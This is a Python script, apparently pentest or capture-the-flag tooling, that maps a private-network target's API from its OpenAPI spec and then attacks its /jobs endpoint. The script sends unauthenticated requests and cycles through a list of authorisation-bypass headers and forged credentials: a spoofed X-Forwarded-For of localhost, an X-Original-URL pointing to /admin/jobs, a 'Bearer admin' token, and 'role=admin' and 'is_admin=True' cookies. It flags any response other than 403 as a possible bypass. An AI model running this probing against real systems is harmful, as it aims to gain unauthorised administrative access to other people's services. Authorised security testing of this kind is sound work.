import requests
import json
import sys

TARGET_URL = "http://10.0.162.112:80"
OPENAPI_URL = f"{TARGET_URL}/openapi.json"

def fetch_openapi_spec(session):
    try:
        resp = session.get(OPENAPI_URL, timeout=10)
        resp.raise_for_status()
        return resp.json()
    except Exception as e:
        print(f"[-] Failed to fetch OpenAPI spec: {e}")
        return None

def extract_security_schemes(spec):
    schemes = spec.get("components", {}).get("securitySchemes", {})
    print("\n[*] Security Schemes:")
    for name, scheme in schemes.items():
        print(f"  - {name}: type={scheme.get('type')}, scheme={scheme.get('scheme')}, bearerFormat={scheme.get('bearerFormat')}")
    return schemes

def extract_all_endpoints(spec):
    paths = spec.get("paths", {})
    print(f"\n[*] Total Paths: {len(paths)}")
    print("=" * 80)
    
    endpoint_list = []
    
    for path, methods in paths.items():
        for method, details in methods.items():
            if method.startswith("x-"):
                continue
            
            endpoint_info = {
                "path": path,
                "method": method.upper(),
                "summary": details.get("summary", ""),
                "description": details.get("description", ""),
                "parameters": [],
                "request_body": None,
                "responses": {},
                "security": details.get("security", None),
                "tags": details.get("tags", [])
            }
            
            # Extract parameters
            for param in details.get("parameters", []):
                param_info = {
                    "name": param.get("name"),
                    "in": param.get("in"),
                    "required": param.get("required", False),
                    "type": param.get("schema", {}).get("type", "unknown"),
                    "default": param.get("schema", {}).get("default", None),
                    "enum": param.get("schema", {}).get("enum", None),
                    "description": param.get("description", "")
                }
                endpoint_info["parameters"].append(param_info)
            
            # Extract request body
            req_body = details.get("requestBody", None)
            if req_body:
                content = req_body.get("content", {})
                for content_type, content_details in content.items():
                    schema_ref = content_details.get("schema", {})
                    endpoint_info["request_body"] = {
                        "content_type": content_type,
                        "required": req_body.get("required", False),
                        "schema": schema_ref
                    }
            
            # Extract responses
            for code, resp_details in details.get("responses", {}).items():
                endpoint_info["responses"][code] = resp_details.get("description", "")
            
            endpoint_list.append(endpoint_info)
            
            print(f"\n  [{endpoint_info['method']}] {path}")
            print(f"    Summary: {endpoint_info['summary']}")
            print(f"    Tags: {endpoint_info['tags']}")
            if endpoint_info["security"] is not None:
                print(f"    Security: {endpoint_info['security']}")
            if endpoint_info["parameters"]:
                print(f"    Parameters:")
                for p in endpoint_info["parameters"]:
                    enum_str = f" enum={p['enum']}" if p['enum'] else ""
                    default_str = f" default={p['default']}" if p['default'] is not None else ""
                    print(f"      - {p['name']} (in={p['in']}, type={p['type']}, required={p['required']}{enum_str}{default_str})")
            if endpoint_info["request_body"]:
                rb = endpoint_info["request_body"]
                print(f"    Request Body: content_type={rb['content_type']}, required={rb['required']}")
                print(f"      Schema: {json.dumps(rb['schema'], indent=6)}")
            print(f"    Responses: {endpoint_info['responses']}")
    
    return endpoint_list

def resolve_schema_ref(spec, schema):
    """Resolve $ref in schema"""
    if isinstance(schema, dict):
        if "$ref" in schema:
            ref_path = schema["$ref"].replace("#/", "").split("/")
            resolved = spec
            for part in ref_path:
                resolved = resolved.get(part, {})
            return resolved
        result = {}
        for k, v in schema.items():
            result[k] = resolve_schema_ref(spec, v)
        return result
    elif isinstance(schema, list):
        return [resolve_schema_ref(spec, item) for item in schema]
    return schema

def analyze_jobs_endpoint(spec, endpoint_list):
    print("\n" + "=" * 80)
    print("[*] Detailed Analysis of /jobs Endpoint")
    print("=" * 80)
    
    jobs_endpoints = [ep for ep in endpoint_list if "/jobs" in ep["path"]]
    
    if not jobs_endpoints:
        print("[-] No /jobs endpoint found!")
        return
    
    for ep in jobs_endpoints:
        print(f"\n  Method: {ep['method']}")
        print(f"  Path: {ep['path']}")
        print(f"  Summary: {ep['summary']}")
        print(f"  Description: {ep['description']}")
        print(f"  Security: {ep['security']}")
        
        if ep["parameters"]:
            print(f"\n  Parameters:")
            for p in ep["parameters"]:
                print(f"    - Name: {p['name']}")
                print(f"      In: {p['in']}")
                print(f"      Type: {p['type']}")
                print(f"      Required: {p['required']}")
                if p['enum']:
                    print(f"      Enum: {p['enum']}")
                if p['default'] is not None:
                    print(f"      Default: {p['default']}")
                if p['description']:
                    print(f"      Description: {p['description']}")
        
        if ep["request_body"]:
            rb = ep["request_body"]
            print(f"\n  Request Body:")
            print(f"    Content-Type: {rb['content_type']}")
            print(f"    Required: {rb['required']}")
            
            resolved_schema = resolve_schema_ref(spec, rb["schema"])
            print(f"    Resolved Schema:")
            print(json.dumps(resolved_schema, indent=4))
            
            # Generate example payload
            example_payload = generate_example_payload(spec, resolved_schema)
            print(f"\n    Generated Example Payload:")
            print(json.dumps(example_payload, indent=4))
        
        print(f"\n  Responses:")
        for code, desc in ep["responses"].items():
            print(f"    {code}: {desc}")

def generate_example_payload(spec, schema):
    """Generate example payload from schema"""
    if not isinstance(schema, dict):
        return schema
    
    if "example" in schema:
        return schema["example"]
    
    if "$ref" in schema:
        resolved = resolve_schema_ref(spec, schema)
        return generate_example_payload(spec, resolved)
    
    if "allOf" in schema:
        result = {}
        for sub_schema in schema["allOf"]:
            sub_payload = generate_example_payload(spec, sub_schema)
            if isinstance(sub_payload, dict):
                result.update(sub_payload)
        return result
    
    if "anyOf" in schema:
        return generate_example_payload(spec, schema["anyOf"][0])
    
    if "oneOf" in schema:
        return generate_example_payload(spec, schema["oneOf"][0])
    
    schema_type = schema.get("type", "object")
    
    if schema_type == "object":
        result = {}
        properties = schema.get("properties", {})
        required_fields = schema.get("required", [])
        for prop_name, prop_schema in properties.items():
            result[prop_name] = generate_example_payload(spec, prop_schema)
        return result
    
    if schema_type == "array":
        items = schema.get("items", {})
        return [generate_example_payload(spec, items)]
    
    if schema_type == "string":
        if "enum" in schema:
            return schema["enum"][0]
        if "default" in schema:
            return schema["default"]
        return "string"
    
    if schema_type == "integer":
        if "default" in schema:
            return schema["default"]
        if "enum" in schema:
            return schema["enum"][0]
        return 0
    
    if schema_type == "number":
        return 0.0
    
    if schema_type == "boolean":
        return schema.get("default", True)
    
    return None

def extract_models(spec):
    schemas = spec.get("components", {}).get("schemas", {})
    if schemas:
        print("\n" + "=" * 80)
        print("[*] Defined Models/Schemas")
        print("=" * 80)
        for name, schema in schemas.items():
            resolved = resolve_schema_ref(spec, schema)
            print(f"\n  {name}:")
            print(json.dumps(resolved, indent=4))

def test_jobs_endpoint(session, endpoint_list):
    print("\n" + "=" * 80)
    print("[*] Testing /jobs Endpoint")
    print("=" * 80)
    
    jobs_endpoints = [ep for ep in endpoint_list if "/jobs" in ep["path"] and ep["method"] == "POST"]
    
    for ep in jobs_endpoints:
        url = TARGET_URL + ep["path"]
        
        # Test 1: No auth
        print(f"\n  [Test 1] POST {url} with no auth")
        try:
            resp = session.post(url, timeout=10)
            print(f"    Status: {resp.status_code}")
            print(f"    Response: {resp.text[:500]}")
        except Exception as e:
            print(f"    Error: {e}")
        
        # Test 2: With JSON content type
        print(f"\n  [Test 2] POST {url} with empty JSON body")
        try:
            resp = session.post(url, json={}, timeout=10)
            print(f"    Status: {resp.status_code}")
            print(f"    Response: {resp.text[:500]}")
        except Exception as e:
            print(f"    Error: {e}")
        
        # Test 3: With admin hint in headers
        admin_headers_list = [
            {"X-Forwarded-For": "127.0.0.1"},
            {"X-Original-URL": "/admin/jobs"},
            {"X-Custom-IP-Authorization": "127.0.0.1"},
            {"X-Real-IP": "127.0.0.1"},
            {"X-Client-IP": "127.0.0.1"},
            {"X-Host": "localhost"},
            {"Authorization": "Bearer admin"},
            {"Cookie": "role=admin"},
            {"Cookie": "is_admin=True"},
            {"User-Agent": "Admin"},
        ]
        
        for headers in admin_headers_list:
            header_desc = ", ".join(f"{k}={v}" for k, v in headers.items())
            print(f"\n  [Test] POST {url} with headers: {header_desc}")
            try:
                resp = session.post(url, json={}, headers=headers, timeout=10)
                print(f"    Status: {resp.status_code}")
                if resp.status_code != 403:
                    print(f"    [!!!] Possible bypass! Response: {resp.text[:500]}")
                else:
                    print(f"    Response: {resp.text[:200]}")
            except Exception as e:
                print(f"    Error: {e}")

def find_auth_endpoints(endpoint_list):
    print("\n" + "=" * 80)
    print("[*] Authentication-Related Endpoints")
    print("=" * 80)
    
    auth_keywords = ["login", "auth", "token", "session", "user", "admin", "register", "signup"]
    
    for ep in endpoint_list:
        path_lower = ep["path"].lower()
        if any(kw in path_lower for kw in auth_keywords):
            print(f"\n  [{ep['method']}] {ep['path']}")
            print(f"    Summary: {ep['summary']}")
            if ep["parameters"]:
                for p in ep["parameters"]:
                    print(f"    Param: {p['name']} (in={p['in']}, type={p['type']}, required={p['required']})")
            if ep["request_body"]:
                rb = ep["request_body"]
                print(f"    Request Body: {json.dumps(rb['schema'], indent=4)}")

def main():
    session = requests.Session()
    session.headers.update({
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "Accept": "application/json"
    })
    
    print(f"[*] Target: {TARGET_URL}")
    print(f"[*] Fetching OpenAPI spec from: {OPENAPI_URL}")
    
    spec = fetch_openapi_spec(session)
    if not spec:
        sys.exit(1)
    
    print(f"[*] API Title: {spec.get('info', {}).get('title', 'Unknown')}")
    print(f"[*] API Version: {spec.get('info', {}).get('version', 'Unknown')}")
    
    # Extract security schemes
    extract_security_schemes(spec)
    
    # Extract all endpoints
    endpoint_list = extract_all_endpoints(spec)
    
    # Extract models
    extract_models(spec)
    
    # Find auth endpoints
    find_auth_endpoints(endpoint_list)
    
    # Detailed /jobs analysis
    analyze_jobs_endpoint(spec, endpoint_list)
    
    # Test /jobs endpoint
    test_jobs_endpoint(session, endpoint_list)

if __name__ == "__main__":
    main()